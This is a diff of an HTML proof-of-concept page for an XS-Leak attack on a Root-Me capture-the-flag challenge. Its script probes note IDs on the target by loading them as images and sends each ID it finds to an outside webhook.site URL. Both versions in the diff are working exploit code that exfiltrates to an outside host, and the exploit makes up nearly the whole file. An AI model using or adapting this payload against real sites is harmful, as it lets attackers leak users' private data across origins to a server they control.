@@ -1,35 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak PoC</title></head>
 <body>
 <script>
-// === CONFIGURATION ===
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const START_ID = 1;       // adjust if IDs start higher
-const MAX_ID = 10000;     // adjust based on expected range
-// ====================
+let id = 1;
 
-let currentId = START_ID;
-
-function testId(id) {
-    const img = new Image();
-    img.onload = () => {
-        // 200 – this note belongs to the current user
-        fetch(WEBHOOK + "?found_note=" + id);
-        // Optional: stop after first hit, or continue to collect more
-        // If you want to stop, return; otherwise continue with next ID
-        // (but the challenge probably has only one admin note)
-        if (id < MAX_ID) testId(id + 1);
-    };
-    img.onerror = () => {
-        // 403 – try next ID
-        if (id < MAX_ID) testId(id + 1);
-    };
-    img.src = TARGET + id;
+function tryId() {
+  const img = new Image();
+  img.onload = () => {
+    // Found! Send to webhook
+    fetch(WEBHOOK + "?admin_note=" + id);
+  };
+  img.onerror = () => {
+    id++;
+    tryId();
+  };
+  img.src = TARGET + id;
 }
-
-testId(currentId);
+tryId();
 </script>
 </body>
 </html>
